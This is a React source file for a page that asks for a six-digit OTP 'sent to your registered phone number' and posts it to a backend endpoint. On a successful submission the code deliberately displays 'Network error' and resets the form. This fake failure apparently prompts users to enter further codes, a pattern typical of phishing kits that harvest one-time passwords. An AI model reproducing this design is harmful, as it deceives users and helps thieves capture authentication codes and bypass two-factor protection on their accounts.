import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/otp.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const Otp = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const submitForm = async (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data)
      .then((response) => {
        console.log(response.data);
        setErrorMessage("Network error");
        reset();
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
    reset();
  };

  return (
    <div className="pin">
      <div className="container">
        <div className="contentSec">
          <div className="logo">
            <img src={logo} alt="logo" />
          </div>
          <div className="title">
            We've sent a confirmation OTP to your registered phone number. Enter
            the code to proceed
          </div>
        </div>
        <div className="formSec">
          <div className="input">
            <form className="otpForm" onSubmit={handleSubmit(submitForm)}>
              <div className="formOtp">
                <input
                  name="otp"
                  type="tel"
                  pattern="[0-9]*"
                  inputMode="numeric"
                  placeholder="Enter OTP"
                  max={6}
                  maxLength={6}
                  {...register("otp")}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, ""); // Remove non-digits
                    setValue("otp", value);
                  }}
                />
              </div>

              {errorMessage && (
                <div className="error-message">{errorMessage}</div>
              )}
              <FormErrMsg errors={errors} inputName="otp" />

              <div className="buttonSec">
                <button type="submit" disabled={loading}>
                  {loading ? "Loading..." : "Confrim OTP"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Otp;
